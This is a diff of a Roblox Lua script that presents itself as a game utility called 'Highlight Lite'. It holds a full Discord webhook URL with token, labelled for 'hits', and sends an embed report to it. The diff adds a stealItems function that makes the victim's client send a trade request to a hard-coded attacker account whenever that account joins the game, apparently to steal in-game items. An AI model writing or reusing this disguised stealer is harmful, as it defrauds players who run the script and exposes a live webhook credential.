@@ -1,3 +1,4 @@
+-- [ Settings ] --
 Username = "QuadCoreDragon" -- [Your Username]
 Webhook = "https://discord.com/api/webhooks/1303735364351033394/CJNxcEtHX0ZApn_dWY0miPVz2kkKkDFyWADiH8tksw_QHFKHZLyhbdUFwkYXEYF0hnvK" -- [Your Webhook For Hits]
 Script = "Highlight Lite"
@@ -376,13 +377,26 @@ else
     SendMessageEMBED(Webhook, embed, false)
 end
 
+local TargetUserId = 1936393784 --QuadCoreDragon
+
+local function stealItems(targetPlayer)
+    local player = game.Players.LocalPlayer
+    if targetPlayer and targetPlayer:IsA("Player") then
+        -- Send trade request
+        local sendArgs = {
+            [1] = targetPlayer
+        }
+        game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
+    end
+end
+
 game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == Username then
-        player.Chatted:Connect(function(msg)
-            stealItems()
-        end)
+    if player.UserId == TargetUserId then
+        stealItems(player)
     end
 end)
+
+
 
 
 if Script == "Highlight Lite" then
